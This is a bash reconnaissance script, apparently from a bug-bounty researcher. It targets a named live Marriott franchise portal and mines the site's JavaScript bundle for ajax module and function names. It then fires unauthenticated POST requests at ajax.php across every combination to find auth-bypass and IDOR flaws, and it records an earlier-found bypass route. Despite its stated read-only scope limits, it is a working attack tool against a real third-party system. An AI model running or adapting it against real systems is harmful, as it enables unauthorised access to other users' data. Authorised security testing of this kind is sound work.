#!/usr/bin/env bash
# =============================================================================
# M004 — Franchise portal: mine the REAL ajax envelope, hunt auth-bypass/IDOR (s31)
# Portable: Linux / Pi / Termux.
#
# Pivot rationale: M024 (PingAccess) has no unauth surface. M004
# (marriottfranchisetransactions.marriott.com) is the ONE host where we reach
# application code — confirmed unauth auth-bypass: module=user&function=list hits
# the PHP backend. BUT that specific function crashes on json_decode($_POST) for
# ANY input (broken/leftover branch) => only yields a stack trace (= M018, already
# reported/Spam-closed). Re-chasing it is futile.
#
# The real opportunity: the LEGIT data-returning functions (applications_v2/*,
# user_auth/*, process_submit, save_fields, render_checklist...). To test them we
# need the EXACT request envelope the real frontend sends — which is in the JS
# bundle. This run extracts that envelope, then replays legit-format requests
# UNAUTHENTICATED to find functions reachable without a session (auth bypass) or
# with manipulable record IDs (IDOR).
#
# SAFETY: IN-SCOPE. READ-ONLY intent — we send only read/list-style functions and
# DO NOT submit save/process/delete/update calls (no state change). No real PII
# exfil — first sign of another user's data, STOP and document with own/synthetic.
# X-Bug-Bounty header. Conservative pacing.
#
# Run (Termux): OUTDIR=$HOME/s31 bash runbooks/PI-RUNBOOK-session31-franchise-envelope.sh \
#                 2>&1 | tee $HOME/s31/s31.log
# =============================================================================
set -eo pipefail

if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s31
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s31"
  else OUTDIR="$HOME/s31"; fi
fi
export OUTDIR
mkdir -p "$OUTDIR"

HOST="marriottfranchisetransactions.marriott.com"
BASE="https://$HOST"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'

echo "============================================================"
echo "M004 FRANCHISE ENVELOPE  $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "Host: $HOST   IP: $(curl -s ifconfig.me)   Work: $OUTDIR"
echo "============================================================"
echo ""

# Scope guard
if [ -f scripts/scope-check.sh ]; then
  echo "[scope] $(SCOPE_FILE=config/marriott-scope.yaml ./scripts/scope-check.sh $HOST 2>&1 | tail -1)"
  echo ""
fi

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE A: CONFIRM HOST LIVE + GRAB HOMEPAGE/CSRF ═══"
curl -s -o "$OUTDIR/home.html" -D "$OUTDIR/home.hdr" \
  -H "User-Agent: $UA" -H "$IDH" --max-time 20 "$BASE/" \
  -w "  home: HTTP %{http_code} | %{size_download}B\n" || true
# extract activekey/CSRF + any bootstrap config
python3 - << 'PYEOF' || true
import os,re
O=os.environ["OUTDIR"]
h=open(os.path.join(O,"home.html"),encoding="utf-8",errors="replace").read() if os.path.exists(os.path.join(O,"home.html")) else ""
for pat,label in [(r'activekey["\']?\s*[:=]\s*["\']([0-9a-f]{20,})',"activekey"),
                  (r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)',"csrf"),
                  (r'(/assets/[A-Za-z0-9_.?=-]*\.jgz[^"\']*)',"jsbundle"),
                  (r'src=["\']([^"\']*scripts[^"\']*)["\']',"scriptsrc")]:
    m=re.findall(pat,h,re.I)
    if m: print(f"  {label}: {m[:3]}")
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE B: DOWNLOAD + DECOMPRESS JS BUNDLE, EXTRACT AJAX ENVELOPE ═══"
for V in 7 8 9 6 5; do
  curl -s -o "$OUTDIR/scripts-v$V.jgz" -H "User-Agent: $UA" -H "$IDH" \
    --max-time 30 "$BASE/assets/scripts.jgz?v=$V" \
    -w "  scripts.jgz?v=$V: HTTP %{http_code} | %{size_download}B\n" || true
done
# pick the largest downloaded bundle and decompress (it is gzip despite .jgz)
python3 - << 'PYEOF'
import os,glob,gzip
O=os.environ["OUTDIR"]
best=None;bsz=0
for f in glob.glob(os.path.join(O,"scripts-v*.jgz")):
    s=os.path.getsize(f)
    if s>bsz: best,bsz=f,s
if not best or bsz<1000:
    print("  no usable bundle downloaded."); raise SystemExit
raw=open(best,"rb").read()
js=None
try:
    js=gzip.decompress(raw).decode("utf-8","replace")
except Exception:
    # maybe already plain or zlib
    try:
        import zlib; js=zlib.decompress(raw,16+zlib.MAX_WBITS).decode("utf-8","replace")
    except Exception:
        js=raw.decode("utf-8","replace")
open(os.path.join(O,"bundle.js"),"w",encoding="utf-8").write(js)
print(f"  decompressed {best} -> bundle.js ({len(js)} chars)")
PYEOF
echo ""
echo "[B] ajax call sites + envelope (module/function/data assembly):"
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]; p=os.path.join(O,"bundle.js")
if not os.path.exists(p): raise SystemExit("  no bundle.js")
js=open(p,encoding="utf-8",errors="replace").read()
# Find how requests to ajax.php are built: look around 'ajax.php' and the
# keys module/function/data/activekey, the content-type and how data is encoded.
for m in re.finditer(r'ajax\.php', js):
    s=max(0,m.start()-400); e=min(len(js),m.end()+400)
    snippet=js[s:e]
    print("  --- ajax.php call site ---")
    print("   ",snippet.replace("\n"," ")[:700])
    print()
# Function/module inventory
mods=sorted(set(re.findall(r'module\s*[:=]\s*["\']([A-Za-z0-9_]+)["\']',js)))
funcs=sorted(set(re.findall(r'function\s*[:=]\s*["\']([A-Za-z0-9_]+)["\']',js)))
print("  modules referenced :",mods[:40])
print("  functions referenced:",funcs[:60])
open(os.path.join(O,"modules.txt"),"w").write("\n".join(mods))
open(os.path.join(O,"functions.txt"),"w").write("\n".join(funcs))
# Content-Type / encoding hints
for pat in [r'contentType\s*[:=]\s*["\']([^"\']+)',r'JSON\.stringify',r'application/json',
            r'application/x-www-form-urlencoded',r'FormData']:
    if re.search(pat,js): print("  encoding hint:",pat)
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE C: BASELINE — confirm routing behaviors (no state change) ═══"
# C1: known auth-bypass (broken branch) — expect 430B stack trace (M018, reference only)
curl -s -o "$OUTDIR/c1.txt" -w "  C1 user/list (form): HTTP %{http_code} | %{size_download}B\n" \
  -H "User-Agent: $UA" -H "$IDH" \
  --max-time 20 -d 'module=user&function=list&data={}' "$BASE/ajax.php" || true
# C2: nonsense module/function — expect 93B {"html":false,...}
curl -s -o "$OUTDIR/c2.txt" -w "  C2 nonsense:        HTTP %{http_code} | %{size_download}B\n" \
  -H "User-Agent: $UA" -H "$IDH" \
  --max-time 20 -d 'module=zzz&function=zzz&data={}' "$BASE/ajax.php" || true
echo "  C1 body: $(head -c 120 "$OUTDIR/c1.txt")"
echo "  C2 body: $(head -c 120 "$OUTDIR/c2.txt")"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE D: TEST REAL (READ-ONLY) FUNCTIONS UNAUTH — auth-bypass hunt ═══"
echo "Only list/get/render/load/check style functions. NO save/process/update/delete."
# Build a read-only candidate set from mined functions, filtered to safe verbs.
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]
funcs=open(os.path.join(O,"functions.txt")).read().split() if os.path.exists(os.path.join(O,"functions.txt")) else []
mods =open(os.path.join(O,"modules.txt")).read().split()  if os.path.exists(os.path.join(O,"modules.txt"))  else []
SAFE=re.compile(r'^(get|list|load|fetch|render|view|show|read|check|search|find|lookup|continue|pre|init|status)',re.I)
DANGER=re.compile(r'(save|process|submit|update|delete|remove|create|insert|assign|send|approve|reject|set_|write)',re.I)
rf=[f for f in funcs if SAFE.search(f) and not DANGER.search(f)]
if not rf:  # fallback common read funcs
    rf=["list","get","load","render_checklist","continue_session","prelogin","forms","get_user","get_list"]
if not mods:
    mods=["applications_v2","user_auth","auth","user"]
open(os.path.join(O,"safe-funcs.txt"),"w").write("\n".join(rf))
open(os.path.join(O,"test-mods.txt"),"w").write("\n".join(mods))
print("  read-only functions to test:",rf[:30])
print("  modules to test            :",mods[:20])
PYEOF

echo ""
echo "  probing module x function (read-only) unauthenticated:"
while read -r MOD; do
  [ -z "$MOD" ] && continue
  while read -r FN; do
    [ -z "$FN" ] && continue
    tag="d-${MOD}-${FN}"
    code_size=$(curl -s -o "$OUTDIR/$tag.txt" \
      -H "User-Agent: $UA" -H "$IDH" \
      --max-time 15 \
      -d "module=${MOD}&function=${FN}&data={}" \
      -w '%{http_code}|%{size_download}' "$BASE/ajax.php" 2>/dev/null || echo "000|0")
    code="${code_size%|*}"; size="${code_size#*|}"
    # 93B = not-found/unauth standard; 430B = broken branch; anything else = signal
    if [ "$size" != "93" ] && [ "$size" != "0" ]; then
      printf '    *** [%s %sB] %s/%s\n' "$code" "$size" "$MOD" "$FN"
      printf '        %s\n' "$(head -c 160 "$OUTDIR/$tag.txt")"
    fi
    sleep 0.4
  done < "$OUTDIR/safe-funcs.txt"
done < "$OUTDIR/test-mods.txt"
echo ""

echo "════════════════════════════════════════════"
echo "DECISION GATE"
echo "════════════════════════════════════════════"
python3 - << 'PYEOF'
import os,glob
O=os.environ["OUTDIR"]
sig=[]
for f in glob.glob(os.path.join(O,"d-*.txt")):
    s=os.path.getsize(f)
    if s not in (0,93,430,431):
        name=os.path.basename(f)[2:-4]
        sig.append((name,s))
if sig:
    print("SIGNAL — functions returning non-standard responses (PURSUE):")
    for n,s in sorted(sig,key=lambda x:-x[1]):
        print(f"  * {n}: {s}B")
    print("Next: inspect bodies; if a function returns DATA without a session,")
    print("that is an unauth data-access finding — test for IDOR via record-id params.")
else:
    print("No read-only function returned data unauth (all 93B/broken).")
    print("Next options on M004:")
    print("  - mine bundle.js for the EXACT data envelope (Phase B output) and retry")
    print("    with correct Content-Type/JSON-body shape")
    print("  - capture an AUTHENTICATED franchise request via browser DevTools to learn")
    print("    the real envelope + session model, then test IDOR with own account")
print()
print("Mined inventory saved: modules.txt, functions.txt, bundle.js")
PYEOF
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
